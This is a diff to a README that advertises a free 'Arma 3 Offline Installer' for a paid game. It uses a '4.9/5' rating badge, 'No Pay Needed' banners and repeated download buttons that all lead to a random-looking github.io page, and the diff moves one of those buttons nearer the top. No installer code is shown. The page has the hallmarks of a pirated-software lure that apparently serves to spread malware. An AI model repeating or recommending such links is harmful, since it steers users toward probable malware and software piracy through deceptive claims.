@@ -5,7 +5,7 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Type-simulation-F9A825?style=for-the-badge&logo=gamepad" />
+  <img src="https://img.shields.io/badge/Type-fps-F9A825?style=for-the-badge&logo=gamepad" />
 </p>
 
 **🎮 Arma 3 Offline Installer Free** — professional offline installer for Arma 3. Works without internet access during setup, no extra subscriptions required. Download for 2026. **Full offline installation.** No limits. No hidden fees.
@@ -19,6 +19,16 @@
 <p align="center">
   <img src="https://readme-typing-svg.herokuapp.com?color=F9A825&size=28&center=true&vCenter=true&width=900&lines=🎮+Arma%203+Offline+Installer;⭐+Professional+Grade+Software;🌟+Full+Offline+Installation+2026;🔥+No+Pay+Needed" />
 </p>
+
+<p align="center">
+  <img src="https://cdn.akamai.steamstatic.com/steam/apps/107410/header.jpg" alt="Arma 3" width="460"/>
+</p>
+
+<div align="center">
+
+[![Download](https://img.shields.io/badge/⬇_Download_Arma%203-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
+
+</div>
 
 ---
 
@@ -47,10 +57,6 @@
 
 ### Step 1: Download
 
-<p align="center">
-  <img src="https://cdn.akamai.steamstatic.com/steam/apps/107410/header.jpg" alt="Arma 3" width="460"/>
-</p>
-
 <div align="center">
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://etgysfcihddy.github.io/windows-dl/)
@@ -65,12 +71,6 @@
 ### Step 2: Install and launch
 
 - Run the installer → Follow instructions → Launch Arma 3
-
-<div align="center">
-
-[![Download](https://img.shields.io/badge/⬇_Download_Arma%203-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
-
-</div>
 
 ---
 
